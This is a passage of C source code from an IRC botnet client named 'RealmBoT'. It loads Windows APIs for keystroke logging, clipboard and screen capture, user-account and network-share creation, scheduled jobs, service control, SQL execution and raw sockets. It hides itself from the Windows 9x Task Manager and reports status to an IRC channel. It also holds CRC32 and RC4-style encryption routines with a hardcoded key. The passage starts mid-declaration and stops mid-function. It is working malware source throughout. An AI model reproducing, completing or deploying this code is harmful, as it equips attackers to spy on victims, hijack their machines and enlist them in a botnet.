NSD fNetShareDel;
NSE fNetShareEnum;
NSJA fNetScheduleJobAdd;
NABF fNetApiBufferFree;
NRTOD fNetRemoteTOD;
NUA fNetUserAdd;
NUD fNetUserDel;
NUE fNetUserEnum;
NUGI fNetUserGetInfo;
NMBS fNetMessageBufferSend;

// dnsapi.dll function variables
DFRC fDnsFlushResolverCache;
DFRCEA fDnsFlushResolverCacheEntry_A;

// iphlpapi.dll function variables
GINT fGetIpNetTable;
DINE fDeleteIpNetEntry;

// mpr.dll function variables
WNAC2 fWNetAddConnection2;
WNAC2W fWNetAddConnection2W;
WNCC2 fWNetCancelConnection2;
WNCC2W fWNetCancelConnection2W;

// shell32.dll function variables
SE fShellExecute;
SHCN fSHChangeNotify;

// odbc32.dll function variables
SQLDC fSQLDriverConnect;
SQLSEA fSQLSetEnvAttr;
SQLED fSQLExecDirect;
SQLAH fSQLAllocHandle;
SQLFH fSQLFreeHandle;
SQLD fSQLDisconnect;



// globals for dynamic libraries
BOOL nokernel32 = FALSE;
DWORD nokernel32err = 0;
BOOL nouser32 = FALSE;
DWORD nouser32err = 0;
BOOL noadvapi32 = FALSE;
DWORD noadvapi32err = 0;
BOOL nogdi32 = FALSE;
DWORD nogdi32err = 0;
BOOL nows2_32 = FALSE;
DWORD nows2_32err = 0;
BOOL nowininet = FALSE;
DWORD nowinineterr = 0;
BOOL noicmp = FALSE;
DWORD noicmperr = 0;
BOOL nonetapi32 = FALSE;
DWORD nonetapi32err = 0;
BOOL nodnsapi = FALSE;
DWORD nodnsapierr = 0;
BOOL noiphlpapi = FALSE;
DWORD noiphlpapierr = 0;
BOOL nompr = FALSE;
DWORD nomprerr = 0;
BOOL noshell32 = FALSE;
DWORD noshell32err = 0;
BOOL noodbc32 = FALSE;
DWORD noodbc32err = 0;
BOOL noavicap32 = FALSE;
DWORD noavicap32err = 0;

BOOL LoadDLLs(void)
{
	// dynamically load kernel32.dll
	HMODULE kernel32_dll = GetModuleHandle("kernel32.dll");
	if (kernel32_dll) {
		fSetErrorMode = (SEM)GetProcAddress(kernel32_dll, "SetErrorMode");
		fCreateToolhelp32Snapshot = (CT32S)GetProcAddress(kernel32_dll, "CreateToolhelp32Snapshot");
		fProcess32First = (P32F)GetProcAddress(kernel32_dll, "Process32First");
		fProcess32Next = (P32N)GetProcAddress(kernel32_dll, "Process32Next");
		fModule32First = (M32F)GetProcAddress(kernel32_dll, "Module32First");
		fGetDiskFreeSpaceEx = (GDFSE)GetProcAddress(kernel32_dll, "GetDiskFreeSpaceExA");
		fGetLogicalDriveStrings = (GLDS)GetProcAddress(kernel32_dll, "GetLogicalDriveStringsA");
		fGetDriveType = (GDT)GetProcAddress(kernel32_dll, "GetDriveTypeA");
		fSearchPath = (SP)GetProcAddress(kernel32_dll, "SearchPathA");
		fQueryPerformanceCounter = (QPC)GetProcAddress(kernel32_dll, "QueryPerformanceCounter");
		fQueryPerformanceFrequency = (QPF)GetProcAddress(kernel32_dll, "QueryPerformanceFrequency");

		if (!fSetErrorMode || !fCreateToolhelp32Snapshot || !fProcess32First || !fProcess32Next
			|| !fGetDiskFreeSpaceEx || !fGetLogicalDriveStrings || !fGetDriveType || !fSearchPath
			|| !fQueryPerformanceCounter || !fQueryPerformanceFrequency)
			nokernel32 = TRUE;

		fRegisterServiceProcess = (RSP)GetProcAddress(kernel32_dll, "RegisterServiceProcess");
		// hide from the Windows 9x Task Manager
		if (fRegisterServiceProcess)
			fRegisterServiceProcess(0, 1);
	} else {
		nokernel32err = GetLastError();
		nokernel32 = TRUE;
	}

	// dynamically load user32.dll
 	HMODULE user32_dll = LoadLibrary("user32.dll");
    if (user32_dll) {
		fSendMessage = (SM)GetProcAddress(user32_dll,"SendMessageA");
		fFindWindow = (FW)GetProcAddress(user32_dll,"FindWindowA");
		fIsWindow = (IW)GetProcAddress(user32_dll,"IsWindow");
		fDestroyWindow = (DW)GetProcAddress(user32_dll,"DestroyWindow");
		fOpenClipboard = (OC)GetProcAddress(user32_dll,"OpenClipboard");
		fGetClipboardData = (GCD)GetProcAddress(user32_dll,"GetClipboardData");
		fCloseClipboard = (CC)GetProcAddress(user32_dll,"CloseClipboard");
		fExitWindowsEx = (EWE)GetProcAddress(user32_dll,"ExitWindowsEx");

		if (!fSendMessage || !fFindWindow || !fIsWindow || !fDestroyWindow
			|| !fOpenClipboard || !fGetClipboardData || !fCloseClipboard
			|| !fExitWindowsEx)
	        nouser32 = TRUE;

		#ifndef NO_KEYLOG
		fGetAsyncKeyState = (GAKS)GetProcAddress(user32_dll,"GetAsyncKeyState");
		fGetKeyState = (GKS)GetProcAddress(user32_dll,"GetKeyState");
		fGetWindowText = (GWT)GetProcAddress(user32_dll,"GetWindowTextA");
		fGetForegroundWindow = (GFW)GetProcAddress(user32_dll,"GetForegroundWindow");

		if (!fGetAsyncKeyState || !fGetKeyState || !fGetWindowText || !fGetForegroundWindow)
			nouser32 = TRUE;
		#endif
	} else {
		nouser32err = GetLastError();
		nouser32 = TRUE;
	}

	// dynamically load advapi32.dll
 	HMODULE advapi32_dll = GetModuleHandle("advapi32.dll");
    if (advapi32_dll) {
		fRegOpenKeyEx = (ROKE)GetProcAddress(advapi32_dll,"RegOpenKeyExA");
		fRegCreateKeyEx = (RCKE)GetProcAddress(advapi32_dll,"RegCreateKeyExA");
		fRegSetValueEx = (RSVE)GetProcAddress(advapi32_dll,"RegSetValueExA");
		fRegQueryValueEx = (RQVE)GetProcAddress(advapi32_dll,"RegQueryValueExA");
		fRegDeleteValue = (RDV)GetProcAddress(advapi32_dll,"RegDeleteValueA");
		fRegCloseKey = (RCK)GetProcAddress(advapi32_dll,"RegCloseKey");

		if (!fRegOpenKeyEx || !fRegCreateKeyEx || !fRegSetValueEx
			|| !fRegQueryValueEx || !fRegDeleteValue || !fRegCloseKey)
	        noadvapi32 = TRUE;

		#ifndef NO_PROCESS
		fOpenProcessToken = (OPT)GetProcAddress(advapi32_dll,"OpenProcessToken");
		fLookupPrivilegeValue = (LPV)GetProcAddress(advapi32_dll,"LookupPrivilegeValueA");
		fAdjustTokenPrivileges = (ATP)GetProcAddress(advapi32_dll,"AdjustTokenPrivileges");

		if (!fOpenProcessToken || !fLookupPrivilegeValue || !fAdjustTokenPrivileges)
	        noadvapi32 = TRUE;
		#endif

		#ifndef NO_NET
	 	fOpenSCManager = (OSCM)GetProcAddress(advapi32_dll,"OpenSCManagerA");
	 	fOpenService = (OS)GetProcAddress(advapi32_dll,"OpenServiceA");
	 	fStartService = (SS)GetProcAddress(advapi32_dll,"StartServiceA");
	 	fControlService = (CS)GetProcAddress(advapi32_dll,"ControlService");
	 	fDeleteService = (DS)GetProcAddress(advapi32_dll,"DeleteService");
	 	fCloseServiceHandle = (CSH)GetProcAddress(advapi32_dll,"CloseServiceHandle");
	 	fEnumServicesStatus = (ESS)GetProcAddress(advapi32_dll,"EnumServicesStatusA");
		fIsValidSecurityDescriptor = (IVSD)GetProcAddress(advapi32_dll,"IsValidSecurityDescriptor");

		if (!fOpenSCManager || !fOpenService || !fStartService || !fControlService
			|| !fDeleteService || !fCloseServiceHandle || !fEnumServicesStatus || !fIsValidSecurityDescriptor)
	        noadvapi32 = TRUE;
		#endif

		#ifndef NO_SYSINFO
		fGetUserName = (GUN)GetProcAddress(advapi32_dll,"GetUserNameA");

		if (!fGetUserName)
			noadvapi32 = TRUE;
		#endif
	} else {
		noadvapi32err = GetLastError();
		noadvapi32 = TRUE;
	}

	// dynamically load gdi32.dll
 	HMODULE gdi32_dll = GetModuleHandle("gdi32.dll");
    if (gdi32_dll) {
		fCreateDC = (CDC)GetProcAddress(gdi32_dll,"CreateDCA");
		fCreateDIBSection = (CDIBS)GetProcAddress(gdi32_dll,"CreateDIBSection");
		fCreateCompatibleDC = (CCDC)GetProcAddress(gdi32_dll,"CreateCompatibleDC");
		fGetDeviceCaps = (GDC)GetProcAddress(gdi32_dll,"GetDeviceCaps");
		fGetDIBColorTable = (GDIBCT)GetProcAddress(gdi32_dll,"GetDIBColorTable");
		fSelectObject = (SO)GetProcAddress(gdi32_dll,"SelectObject");
		fBitBlt = (BB)GetProcAddress(gdi32_dll,"BitBlt");
		fDeleteDC = (DDC)GetProcAddress(gdi32_dll,"DeleteDC");
		fDeleteObject = (DO)GetProcAddress(gdi32_dll,"DeleteObject");

		if (!fCreateDC || !fCreateDIBSection || !fCreateCompatibleDC || !fGetDeviceCaps
			|| !fGetDIBColorTable || !fSelectObject || !fBitBlt || !fDeleteDC || !fDeleteObject)
	        nogdi32 = TRUE;
	} else {
		nogdi32err = GetLastError();
		nogdi32 = TRUE;
	}

    // dynamically load ws2_32.dll
 	HMODULE ws2_32_dll = LoadLibrary("ws2_32.dll");
    if (ws2_32_dll) {
	 	fWSAStartup = (WSAS)GetProcAddress(ws2_32_dll,"WSAStartup");
		fWSASocket = (WSASo)GetProcAddress(ws2_32_dll,"WSASocketA");
		fWSAAsyncSelect = (WSAAS)GetProcAddress(ws2_32_dll,"WSAAsyncSelect");
		__fWSAFDIsSet = (WSAFDIS)GetProcAddress(ws2_32_dll,"__WSAFDIsSet");
		fWSAIoctl = (WSAI)GetProcAddress(ws2_32_dll,"WSAIoctl");
		fWSAGetLastError = (WSAGLE)GetProcAddress(ws2_32_dll,"WSAGetLastError");
		fWSACleanup = (WSAC)GetProcAddress(ws2_32_dll,"WSACleanup");
  		fsocket = (SOCK)GetProcAddress(ws2_32_dll,"socket");
		fioctlsocket = (IOCTLS)GetProcAddress(ws2_32_dll,"ioctlsocket");
		fconnect = (CON)GetProcAddress(ws2_32_dll,"connect");
		finet_ntoa = (INTOA)GetProcAddress(ws2_32_dll,"inet_ntoa");
		finet_addr = (IADDR)GetProcAddress(ws2_32_dll,"inet_addr");
		fhtons = (HTONS)GetProcAddress(ws2_32_dll,"htons");
		fhtonl = (HTONL)GetProcAddress(ws2_32_dll,"htonl");
		fntohs = (NTOHS)GetProcAddress(ws2_32_dll,"ntohs");
		fntohl = (NTOHL)GetProcAddress(ws2_32_dll,"ntohl");
		fsend = (SEND)GetProcAddress(ws2_32_dll,"send");
		fsendto = (SENDTO)GetProcAddress(ws2_32_dll,"sendto");
		frecv = (RECV)GetProcAddress(ws2_32_dll,"recv");
		frecvfrom = (RECVFROM)GetProcAddress(ws2_32_dll,"recvfrom");
		fbind = (BIND)GetProcAddress(ws2_32_dll,"bind");
		fselect = (SEL)GetProcAddress(ws2_32_dll,"select");
		flisten = (LIS)GetProcAddress(ws2_32_dll,"listen");
		faccept = (ACC)GetProcAddress(ws2_32_dll,"accept");
		fsetsockopt = (SSO)GetProcAddress(ws2_32_dll,"setsockopt");
		fgetsockname = (GSN)GetProcAddress(ws2_32_dll,"getsockname");
		fgethostname = (GHN)GetProcAddress(ws2_32_dll,"gethostname");
		fgethostbyname = (GHBN)GetProcAddress(ws2_32_dll,"gethostbyname");
		fgethostbyaddr = (GHBA)GetProcAddress(ws2_32_dll,"gethostbyaddr");
		fgetpeername = (GPN)GetProcAddress(ws2_32_dll,"getpeername");
		fclosesocket = (CLSO)GetProcAddress(ws2_32_dll,"closesocket");

		if (!fWSAStartup || !fWSASocket || !fWSAAsyncSelect || !fWSAIoctl || !fWSAGetLastError
			|| !fWSACleanup || !fsocket || !fioctlsocket || !fconnect || !finet_ntoa || !finet_addr
			|| !fhtons || !fhtonl || !fntohs || !fsend || !fsendto || !frecv || !frecvfrom || !fbind
			|| !fselect || !flisten || !faccept || !fsetsockopt || !fgetsockname || !fgethostname
			|| !fgethostbyname || !fgethostbyaddr || !fclosesocket)
	        nows2_32 = TRUE;
	} else {
		nows2_32err = GetLastError();
		nows2_32 = TRUE;
	}

	// dynamically load wininet.dll
	HMODULE wininet_dll = LoadLibrary("wininet.dll");
    if (wininet_dll) {
		fInternetGetConnectedState = (IGCS)GetProcAddress(wininet_dll, "InternetGetConnectedState");
	 	fInternetGetConnectedStateEx = (IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
	 	fHttpOpenRequest = (HOR)GetProcAddress(wininet_dll, "HttpOpenRequestA");
	 	fHttpSendRequest = (HSR)GetProcAddress(wininet_dll, "HttpSendRequestA");
	 	fInternetConnect = (IC)GetProcAddress(wininet_dll, "InternetConnectA");
	 	fInternetOpen = (IO)GetProcAddress(wininet_dll, "InternetOpenA");
	 	fInternetOpenUrl = (IOU)GetProcAddress(wininet_dll, "InternetOpenUrlA");
	 	fInternetCrackUrl = (ICU)GetProcAddress(wininet_dll, "InternetCrackUrlA");
	 	fInternetReadFile = (IRF)GetProcAddress(wininet_dll, "InternetReadFile");
	 	fInternetCloseHandle = (ICH)GetProcAddress(wininet_dll, "InternetCloseHandle");

		if (!fInternetGetConnectedState || !fInternetGetConnectedStateEx || !fHttpOpenRequest
			|| !fHttpSendRequest || !fInternetConnect || !fInternetOpen || !fInternetOpenUrl
			|| !fInternetCrackUrl || !fInternetReadFile || !fInternetCloseHandle)
			nowininet = TRUE;

		if (fInternetOpen) {
				ih = fInternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
				if (ih == NULL) ih = 0;
		}
	} else {
		nowinineterr = GetLastError();
		nowininet = TRUE;
		ih = 0;
	}

	#ifndef NO_PING
	// dynamically load icmp.dll
 	HMODULE icmp_dll = LoadLibrary("icmp.dll");
    if (icmp_dll) {
	 	fIcmpCreateFile = (ICF)GetProcAddress(icmp_dll,"IcmpCreateFile");
 		fIcmpCloseHandle = (ICH)GetProcAddress(icmp_dll,"IcmpCloseHandle");
 		fIcmpSendEcho = (ISE)GetProcAddress(icmp_dll,"IcmpSendEcho");

		if (!fIcmpCreateFile || !fIcmpCloseHandle || !fIcmpSendEcho)
	        noicmp = TRUE;
	} else {
		noicmperr = GetLastError();
		noicmp = TRUE;
	}
	#endif

	// dynamically load netapi32.dll
 	HMODULE netapi32_dll = LoadLibrary("netapi32.dll");
    if (netapi32_dll) {
	 	fNetShareAdd = (NSA)GetProcAddress(netapi32_dll,"NetShareAdd");
	 	fNetShareDel = (NSD)GetProcAddress(netapi32_dll,"NetShareDel");
		fNetShareEnum = (NSE)GetProcAddress(netapi32_dll,"NetShareEnum");
	 	fNetScheduleJobAdd = (NSJA)GetProcAddress(netapi32_dll,"NetScheduleJobAdd");
	 	fNetApiBufferFree = (NABF)GetProcAddress(netapi32_dll,"NetApiBufferFree");
	 	fNetRemoteTOD = (NRTOD)GetProcAddress(netapi32_dll,"NetRemoteTOD");
	 	fNetUserAdd = (NUA)GetProcAddress(netapi32_dll,"NetUserAdd");
	 	fNetUserDel = (NUD)GetProcAddress(netapi32_dll,"NetUserDel");
	 	fNetUserEnum = (NUE)GetProcAddress(netapi32_dll,"NetUserEnum");
	 	fNetUserGetInfo = (NUGI)GetProcAddress(netapi32_dll,"NetUserGetInfo");
		fNetMessageBufferSend = (NMBS)GetProcAddress(netapi32_dll,"NetMessageBufferSend");

		if (!fNetShareAdd || !fNetShareDel || !fNetShareEnum || !fNetScheduleJobAdd
			|| !fNetApiBufferFree || !fNetRemoteTOD || !fNetUserAdd || !fNetUserDel
			|| !fNetUserEnum || !fNetUserGetInfo || !fNetMessageBufferSend)
	        nonetapi32 = TRUE;
	} else {
		nonetapi32err = GetLastError();
		nonetapi32 = TRUE;
	}

	// dynamically load dnsapi.dll
 	HMODULE dnsapi_dll = LoadLibrary("dnsapi.dll");
    if (dnsapi_dll) {
	 	fDnsFlushResolverCache = (DFRC)GetProcAddress(dnsapi_dll,"DnsFlushResolverCache");
	 	fDnsFlushResolverCacheEntry_A = (DFRCEA)GetProcAddress(dnsapi_dll,"DnsFlushResolverCacheEntry_A");

		if (!fDnsFlushResolverCache || !fDnsFlushResolverCacheEntry_A)
	        nodnsapi = TRUE;
	} else {
		nodnsapierr = GetLastError();
		nodnsapi = TRUE;
	}

	// dynamically load iphlpapi.dll
 	HMODULE iphlpapi_dll = LoadLibrary("iphlpapi.dll");
    if (iphlpapi_dll) {
	 	fGetIpNetTable = (GINT)GetProcAddress(iphlpapi_dll,"GetIpNetTable");
	 	fDeleteIpNetEntry = (DINE)GetProcAddress(iphlpapi_dll,"DeleteIpNetEntry");

		if (!fGetIpNetTable || !fDeleteIpNetEntry)
	        noiphlpapi = TRUE;
	} else {
		noiphlpapierr = GetLastError();
		noiphlpapi = TRUE;
	}

	// dynamically load mpr.dll
 	HMODULE mpr_dll = LoadLibrary("mpr.dll");
    if (mpr_dll) {
	 	fWNetAddConnection2 = (WNAC2)GetProcAddress(mpr_dll,"WNetAddConnection2A");
	 	fWNetAddConnection2W = (WNAC2W)GetProcAddress(mpr_dll,"WNetAddConnection2W");
	 	fWNetCancelConnection2 = (WNCC2)GetProcAddress(mpr_dll,"WNetCancelConnection2A");
	 	fWNetCancelConnection2W = (WNCC2W)GetProcAddress(mpr_dll,"WNetCancelConnection2W");

		if (!fWNetAddConnection2 || !fWNetAddConnection2W
			|| !fWNetCancelConnection2 || !fWNetCancelConnection2W)
	        nompr = TRUE;
	} else {
		nomprerr = GetLastError();
		nompr = TRUE;
	}

	// dynamically load shell32.dll
 	HMODULE shell32_dll = LoadLibrary("shell32.dll");
    if (shell32_dll) {
	 	fShellExecute = (SE)GetProcAddress(shell32_dll,"ShellExecuteA");
		fSHChangeNotify = (SHCN)GetProcAddress(shell32_dll,"SHChangeNotify");

		if (!fShellExecute || !fSHChangeNotify)
	        noshell32 = TRUE;
	} else {
		noshell32err = GetLastError();
		noshell32 = TRUE;
	}

	// dynamically load odbc32.dll
 	HMODULE odbc32_dll = LoadLibrary("odbc32.dll");
    if (odbc32_dll) {
	 	fSQLDriverConnect = (SQLDC)GetProcAddress(odbc32_dll,"SQLDriverConnect");
	 	fSQLSetEnvAttr = (SQLSEA)GetProcAddress(odbc32_dll,"SQLSetEnvAttr");
	 	fSQLExecDirect = (SQLED)GetProcAddress(odbc32_dll,"SQLExecDirect");
	 	fSQLAllocHandle = (SQLAH)GetProcAddress(odbc32_dll,"SQLAllocHandle");
	 	fSQLFreeHandle = (SQLFH)GetProcAddress(odbc32_dll,"SQLFreeHandle");
	 	fSQLDisconnect = (SQLD)GetProcAddress(odbc32_dll,"SQLDisconnect");

		if (!fSQLDriverConnect || !fSQLSetEnvAttr || !fSQLExecDirect
			|| !fSQLAllocHandle || !fSQLFreeHandle || !fSQLDisconnect)
	        noodbc32 = TRUE;
	} else {
		noodbc32err = GetLastError();
		noodbc32 = TRUE;
	}

	

	return TRUE;
}

void CheckDLLs(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	char sendbuf[IRCLINE];

	if (nokernel32) {
		sprintf(sendbuf,"Kernel32.dll failed. <%d>", nokernel32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nouser32) {
		sprintf(sendbuf,"User32.dll failed. <%d>", nouser32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (noadvapi32) {
		sprintf(sendbuf,"Advapi32.dll failed. <%d>", noadvapi32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nogdi32) {
		sprintf(sendbuf,"Gdi32.dll failed. <%d>", nogdi32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nows2_32) {
		sprintf(sendbuf,"Ws2_32.dll failed. <%d>", nows2_32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nowininet) {
		sprintf(sendbuf,"Wininet.dll failed. <%d>", nowinineterr);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (noicmp) {
		sprintf(sendbuf,"Icmp.dll failed. <%d>", noicmperr);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nonetapi32) {
		sprintf(sendbuf,"Netapi32.dll failed. <%d>", nonetapi32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nodnsapi) {
		sprintf(sendbuf,"Dnsapi.dll failed. <%d>", nodnsapierr);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (noiphlpapi) {
		sprintf(sendbuf,"Iphlpapi.dll failed. <%d>", noiphlpapierr);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nompr) {
		sprintf(sendbuf,"Mpr32.dll failed. <%d>", nomprerr);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (noshell32) {
		sprintf(sendbuf,"Shell32.dll failed. <%d>", noshell32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (noodbc32) {
		sprintf(sendbuf,"Odbc32.dll failed. <%d>", noodbc32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	

	sprintf(sendbuf,"RealmBoT (core.p.l.g) .»».  DLL test complete.");
	if (!silent) irc_privmsg(sock, chan, sendbuf, notice);
	addlog(sendbuf);

	return;
}


/***************************************************************************************/
//								CRC32 code
/***************************************************************************************/
#define _CRC32_(crc, ch)	 (crc = (crc >> 8) ^ crc32tab[(crc ^ (ch)) & 0xff])

/* generated using the AUTODIN II polynomial
 *	x^32 + x^26 + x^23 + x^22 + x^16 +
 *	x^12 + x^11 + x^10 + x^8 + x^7 + x^5 + x^4 + x^2 + x^1 + 1
 */

static const unsigned long crc32tab[256] = {
	0x00000000, 0x77073096, 0xee0e612c, 0x990951ba,
	0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3,
	0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,
	0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91,
	0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de,
	0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,
	0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec,
	0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5,
	0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,
	0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b,
	0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940,
	0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,
	0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116,
	0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f,
	0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,
	0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d,
	0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a,
	0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,
	0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818,
	0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01,
	0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,
	0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457,
	0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c,
	0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,
	0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2,
	0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb,
	0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,
	0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9,
	0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086,
	0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,
	0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4,
	0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad,
	0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,
	0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683,
	0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8,
	0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,
	0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe,
	0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7,
	0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,
	0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5,
	0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252,
	0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,
	0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60,
	0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79,
	0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,
	0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f,
	0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04,
	0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,
	0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a,
	0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713,
	0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,
	0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21,
	0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e,
	0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,
	0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c,
	0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45,
	0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,
	0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db,
	0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0,
	0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,
	0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6,
	0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf,
	0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,
	0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d,
};

unsigned long crc32(char *buf, size_t size)
{
	unsigned long crc = (unsigned long)~0;
	char *p;
	size_t len = 0, nr = size;

	for (len += nr, p = buf; nr--; ++p)
		_CRC32_(crc, *p);

	return ~crc;
}

unsigned long crc32f(char *file)
{
	long pos=0; unsigned long rval;
	char *rbuf=(char *)malloc(0);

	FILE *f_crc;
	if((f_crc=fopen(file,"rb")) == NULL)
		return 0;

	while(!feof(f_crc)) {
		rbuf=(char*)realloc(rbuf,++pos);
		if(rbuf==NULL)
			return 0;
		fread(&rbuf[pos-1],1,1,f_crc);
	}

	rval=crc32(rbuf,pos-1);

	free(rbuf);
	fclose(f_crc);

	return rval;
}

/***************************************************************************************/
//								END OF CRC32 code
/***************************************************************************************/



// this is a nice all-in-one solution to encrypt/decrypt and it's fairly secure
// recommended even for novice users.
void Crypt(TCHAR *inp, DWORD inplen, TCHAR* key, DWORD keylen)
{
	//we will consider size of sbox 256 bytes
	//(extra byte are only to prevent any mishep just in case)
	TCHAR Sbox[257], Sbox2[257], temp = 0 , k = 0;
	unsigned long i=0, j=0, t=0, x=0;

	//this unsecured key is to be used only when there is no input key from user
	TCHAR  OurUnSecuredKey[49]; // CHANGE THIS!!!!!
	OurUnSecuredKey[0]=10; OurUnSecuredKey[1]=14; OurUnSecuredKey[2]=32; OurUnSecuredKey[3]=72;
	OurUnSecuredKey[4]=11; OurUnSecuredKey[5]=43; OurUnSecuredKey[6]=12; OurUnSecuredKey[7]=35;
	OurUnSecuredKey[8]=58; OurUnSecuredKey[9]=39; OurUnSecuredKey[10]=40; OurUnSecuredKey[11]=94;
	OurUnSecuredKey[12]=42; OurUnSecuredKey[13]=30; OurUnSecuredKey[14]=45; OurUnSecuredKey[15]=90;
	OurUnSecuredKey[16]=27; OurUnSecuredKey[17]=15; OurUnSecuredKey[18]=76; OurUnSecuredKey[19]=68;
	OurUnSecuredKey[20]=22; OurUnSecuredKey[21]=04; OurUnSecuredKey[22]=87; OurUnSecuredKey[23]=35;
	OurUnSecuredKey[24]=17; OurUnSecuredKey[25]=83; OurUnSecuredKey[26]=56; OurUnSecuredKey[27]=19;
	OurUnSecuredKey[28]=13; OurUnSecuredKey[29]=18; OurUnSecuredKey[30]=37; OurUnSecuredKey[31]=28;
	OurUnSecuredKey[32]=48; OurUnSecuredKey[33]=18; OurUnSecuredKey[34]=80; OurUnSecuredKey[35]=79;
	OurUnSecuredKey[36]=57; OurUnSecuredKey[37]=16; OurUnSecuredKey[38]=66; OurUnSecuredKey[39]=31;
	OurUnSecuredKey[40]=55; OurUnSecuredKey[41]=29; OurUnSecuredKey[42]=65; OurUnSecuredKey[43]=85;
	OurUnSecuredKey[44]=44; OurUnSecuredKey[45]=65; OurUnSecuredKey[46]=44; OurUnSecuredKey[47]=88;
	OurUnSecuredKey[48]=0;
	//static const int OurKeyLen = _tcslen(OurUnSecuredKey);
	unsigned int OurKeyLen = strlen(OurUnSecuredKey);

    //always initialize the arrays with zero
	ZeroMemory(Sbox, sizeof(Sbox));
	ZeroMemory(Sbox2, sizeof(Sbox2));

    //initialize sbox i
	for(i = 0; i < 256U; i++)
		Sbox[i] = (TCHAR)i;

    //whether user has sent any input key
	if(keylen) {
		//initialize the sbox2 with user key
		for(i = 0; i < 256U ; i++) {
			if(j == keylen)
				j = 0;
			Sbox2[i] = key[j++];
		}
	} else {
		//initialize the sbox2 with our key
		for(i = 0; i < 256U ; i++) {
			if(j == (unsigned long)OurKeyLen)
				j = 0;
			Sbox2[i] = OurUnSecuredKey[j++];
		}
	}

	j = 0 ; //Initialize j
	//scramble sbox1 with sbox2
